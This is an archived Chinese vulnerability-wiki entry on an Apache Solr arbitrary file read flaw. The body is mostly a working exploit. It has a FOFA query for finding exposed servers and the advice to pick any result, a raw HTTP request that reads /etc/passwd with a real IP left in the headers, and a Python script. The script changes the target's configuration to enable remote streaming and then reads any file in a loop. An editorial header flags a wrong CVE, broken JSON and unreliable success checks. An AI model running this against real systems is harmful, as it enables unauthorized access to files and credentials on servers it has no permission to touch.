---
title: "（0day）Apache Solr 任意文件读取漏洞"
product: "Apache Solr"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: "CVE-2019-0193"
identifier_role: "reference"
prerequisites: "core、未鉴权可写Config API、RemoteStreaming开启、dump处理器及文件权限"
source_url: "https://mp.weixin.qq.com/s/1D4j7cF49yfrh1hErD_3OA"
source_status: "recorded"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-b104930d900231626d95b010"
entity_id: "ve-de8b594fcb39cfde9755d7b7"
schema_version: "1"
canonical: "Web安全/中间件/Apache Solr/Apache Solr 任意文件读取漏洞  1Day.md"
relation_type: "duplicate_of"
---

# （0day）Apache Solr 任意文件读取漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：core、未鉴权可写Config API、RemoteStreaming开启、dump处理器及文件权限
- 证据范围：与203/212相同PeiQi脚本体系；frontmatter将脚本旧编号误作主CVE。

### 本次正文校订

- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 0193属于DIH而非此debug/dump机制，必须移除错误绑定
- 手动流程遗漏启用RemoteStreaming，脚本中的启用JSON又含无效\}
- This子串不能判配置成功，文件回显缺状态检查，空core不等于无漏洞
- 0day没有日期、来源/版本证据；公网Origin/Referer残留
- 持久配置变更未告知恢复；随便点目标的教学措辞应改授权实验

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1D4j7cF49yfrh1hErD_3OA)

fofa 语法如下：  

app="Apache-Solr"

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Yia0BblwjsvJ8Fp8YSsl0GRYWDRFITar2CMia2IqZ6nfGdSuSX79tU1NlTULFod1BymFfgO8aAFsg/640?wx_fmt=png)

我们随便点一个进去  

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Yia0BblwjsvJ8Fp8YSsl0Gu3NYHLIywGAkFyACAoiasomiboYTCyTheuAfpJxGX2ibcvmKZZgO5uKbg/640?wx_fmt=png)

POC 如下：  

```http
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
```

当然我们也可以使用 PeiQi 师傅已经写好的 python 脚本  

```python
import requests
import sys
import random
import re
import base64
import time
from lxml import etree
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                        \033[0m')
    print('+  \033[34mVersion: Apache Solr < 8.2.0            \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx:8983  \033[0m')
    print('+  \033[36mFile   >>> 文件名称或目录                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&wt=json"
    try:
        response = requests.request("GET", url=core_url, timeout=10)
        core_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] 成功获得core_name,Url为：" + target_url + "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, core_name):
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true\}\}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在准备文件读取...... \033[0m".format(target_url))
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 可能存在漏洞 \033[0m".format(target_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(File_name)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[x] 读取{}失败 \033[0m".format(File_name))
        else:
            print("\033[36m[o] 响应为:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    core_name = POC_1(target_url)
    POC_2(target_url, core_name)
    while True:
        File_name = str(input("\033[35mFile >>> \033[0m"))
        POC_3(target_url, core_name, File_name)
```

我们把脚本复制到一个 test.py 里，然后开始运行  

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv3Yia0BblwjsvJ8Fp8YSsl0GZqbSsVfAr6CCCiaNc8r9u6dqg18iapdDbnbNr6u8BVqAhtIP2PVsHRKQ/640?wx_fmt=png)

发现成功读取到 / etc/passwd  

Solr

Solr 是一个独立的企业级搜索应用服务器，它对外提供类似于 Web-service 的 API 接口。用户可以通过 http 请求，向搜索引擎服务器提交一定格式的 XML 文件，生成索引；也可以通过 Http Get 操作提出查找请求，并得到 XML 格式的返回结果。

特点
--

Solr 是一个高性能，采用 Java 开发，基于 Lucene 的全文搜索服务器。同时对其进行了扩展，提供了比 Lucene 更为丰富的查询语言，同时实现了可配置、可扩展并对查询性能进行了优化，并且提供了一个完善的功能管理界面，是一款非常优秀的全文搜索引擎。

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
